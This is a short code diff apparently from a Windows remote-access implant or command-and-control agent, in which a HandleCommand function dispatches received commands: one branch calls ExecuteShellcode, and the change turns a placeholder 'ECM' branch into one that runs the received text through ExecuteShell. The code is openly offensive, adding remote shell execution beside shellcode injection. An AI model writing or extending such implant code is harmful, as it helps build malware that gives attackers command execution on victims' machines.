@@ -18,8 +18,9 @@ LPCSTR HandleCommand(LPCSTR command){
 	else if(strstr(command,"INJ") != NULL){
 		return ExecuteShellcode();
 	}
-	else if(strstr(command,"ECM") != NULL){
-		return "OUTPUT OF COMMANDDDD";
+	else if(strstr(command,"ECM-") != NULL){
+		data.erase(0,4);
+		return ExecuteShell(data.c_str());
 	}
 
 	return "ERROR HANDLING COMMAND";
